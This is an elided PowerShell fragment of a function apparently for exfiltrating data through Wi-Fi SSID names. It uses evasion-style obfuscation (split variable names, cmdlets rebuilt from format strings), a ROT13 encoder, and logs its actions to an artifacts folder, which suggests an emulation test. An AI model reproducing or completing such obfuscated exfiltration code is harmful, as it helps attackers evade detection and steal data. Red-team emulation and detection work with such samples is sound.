function Invoke-SSIDExfil {
    ...
    function ConvertTo-ROT13 {
        ...
        ${BU`i`LDER} = .("{0}{2}{1}" -f 'New','t','-Objec') System.Text.StringBuilder
    ...
    ${a`RTifAct`DiR} = .("{0}{2}{1}"-f'Jo','Path','in-') ${P`S`S`cRiPt`RooT} "artifacts\ssid-exfil"
    if (-not (&("{1}{2}{0}" -f'ath','Tes','t-P') ${ARtifA`c`T`Dir})) {
        ${nU`lL} = .("{2}{1}{0}" -f'Item','w-','Ne') -ItemType Directory -Path ${Ar`T`iFAct`DIR} -Force
    }
    if (${D`EC`OdE}) {
    ...
    if ([string]::IsNullOrWhiteSpace(${plAI`Nt`eXT})) {
    ...
    ${Lo`GpAth} = .("{2}{1}{0}" -f 'in-Path','o','J') ${aRt`ifACtD`Ir} "ssid-actions.txt"
    ${cO`MM`AN`dS} = @(
    ...
    &("{2}{0}{1}"-f'Con','tent','Set-') -Path ${Log`pa`TH} -Value ${C`OM`MANdS} -Encoding UTF8
